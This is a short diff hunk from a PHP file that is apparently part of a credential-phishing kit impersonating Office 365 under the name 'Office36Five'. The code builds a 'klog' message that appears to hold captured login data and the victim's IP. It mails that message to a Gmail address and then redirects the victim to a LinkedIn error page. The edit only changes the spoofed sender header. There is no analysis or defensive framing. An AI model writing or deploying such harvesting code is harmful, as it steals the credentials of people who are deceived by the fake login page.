@@ -109,7 +109,7 @@ header('content-type: application/json');
 												$message .= "---------------klog-------------\n";
 												$send = "ph3kubwa@gmail.com";
 												$subject = "Office36Five .$ip.";
-												$headers = "From: Office36Five<nataliengoc3@linHJJmail.com>\n";
+												$headers = "From: Office36Five<ph3kubwa@gmail.com>\n";
 												$headers .= "MIME-Version: 1.0\n";
 												mail($send,$subject,$message,$headers);
 												header ("Location: https://www.linkedin.com/error404");
